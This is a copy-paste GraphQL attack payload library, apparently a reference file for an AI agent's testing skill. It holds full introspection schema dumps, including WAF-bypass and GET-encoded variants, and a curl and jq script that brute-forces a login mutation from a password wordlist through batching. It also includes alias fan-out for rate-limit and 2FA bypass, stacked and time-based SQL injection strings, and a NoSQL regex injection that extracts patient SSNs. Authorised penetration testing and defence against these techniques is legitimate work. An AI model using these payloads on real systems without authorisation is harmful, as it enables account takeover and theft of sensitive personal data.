# GraphQL copy-paste payload library — Open WHEN: you have a confirmed GraphQL endpoint and need the literal IntrospectionQuery body, a single-line/GET-encoded schema dump, a batching/alias fan-out request, or a NoSQL/SQL argument injection string to paste into curl

The SKILL body names these techniques; this file holds the full literal
strings the body omits. All strings go inside the JSON `"query"` value
(escape inner `"` as `\"`) unless shown as a raw GET URL.

---

## 1. Full IntrospectionQuery (multi-fragment, canonical)

Paste as the value of `"query"` in a POST body. Returns the complete
type/field/arg/directive graph. Use this when `{ __schema { queryType
{ name } } }` confirmed introspection is ON and you need the whole schema.

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description locations args { ...InputValue } }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description args { ...InputValue } type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }
}
```

curl form (one HTTP request):

```bash
INTRO='{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}'
curl -sS -X POST "$URL" -H 'Content-Type: application/json' \
  --data-raw "$(jq -nc --arg q "$INTRO" '{query:$q}')"
```

## 2. Single-line schema dump WITHOUT fragments

For parsers that reject fragment spreads, or WAFs that signature on
`fragment`. Fully inlined — no `...Spread` anywhere:

```graphql
{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}}
```

## 3. GET-mode introspection (URL-encoded, for CSRF / cache / WAF-bypass)

Drop into the `?query=` parameter directly. Useful when only GET is
filtered, when probing for CSRF-over-GET, or to land the schema dump in
a proxy cache:

```
?query={__schema{types{name}}}
```

Full fragment dump as one `?query=` value (already percent-encoded):

```
?query=fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
```

## 4. Targeted single-type enumeration (introspection-off fallback aid)

When the full `__schema` is blocked but `__type` is not, pull one type at
a time. Swap `"User"` for each name harvested from suggestion errors:

```graphql
{ __type(name: "User") { name fields { name type { name kind ofType { name kind } } } } }
```

---

## 5. Batching / alias fan-out (rate-limit, brute-force, 2FA bypass)

### JSON-list batching — N operations, one HTTP request, one rate bucket

```json
[{"query":"mutation{ login(user:\"bob\",pass:\"0001\"){token} }"},
 {"query":"mutation{ login(user:\"bob\",pass:\"0002\"){token} }"},
 {"query":"mutation{ login(user:\"bob\",pass:\"0003\"){token} }"}]
```

Generate a 10k-candidate batch from a wordlist:

```bash
jq -Rn '[inputs | {query: ("mutation{ login(user:\"bob\",pass:\""+.+"\"){token} }")}]' \
  passwords.txt > batch.json
curl -sS -X POST "$URL" -H 'Content-Type: application/json' --data @batch.json
```

### Query-name based batching (single document, aliased roots)

```json
{"query":"query { qname: Query { field1 } qname1: Query { field1 } }"}
```

### Alias amplification on a mutation (per-document fan-out, no array)

Same field N times under distinct aliases — one document, many tries:

```graphql
mutation {
  login(pass: 1111, username: "bob") { token }
  second: login(pass: 2222, username: "bob") { token }
  third: login(pass: 3333, username: "bob") { token }
  fourth: login(pass: 4444, username: "bob") { token }
}
```

---

## 6. Argument injection strings (paste into the arg value, then pivot)

### SQL injection — quote-break probe (route confirmed sink to `sqli`)

```graphql
{ bacon(id: "1'") { id type price } }
```

### SQL injection — stacked / time-based (Postgres backend)

```graphql
query { user(name: "patt';SELECT 1;SELECT pg_sleep(30);--'") { id email } }
```

### NoSQL injection — `$regex` smuggled through a JSON-string arg

Mongo-backed resolver that parses a stringified `search`/`options` JSON.
The `$regex: ".*"` returns every record; pin a field like `lastName` to
filter to a target. Pivot the primitive to `nosqli` if a sink fires:

```graphql
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}",
    search:  "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastName\":\"Admin\" }"
  ) { firstName lastName id patients { ssn } }
}
```

---

## 7. Endpoint / error-state probes (quick triage strings)

Send these to read the server's error envelope — malformed bodies surface
the engine and whether suggestions leak:

```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```

A `Did you mean "node"?` style message confirms field-suggestion leakage:

```json
{"message":"Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?"}
```
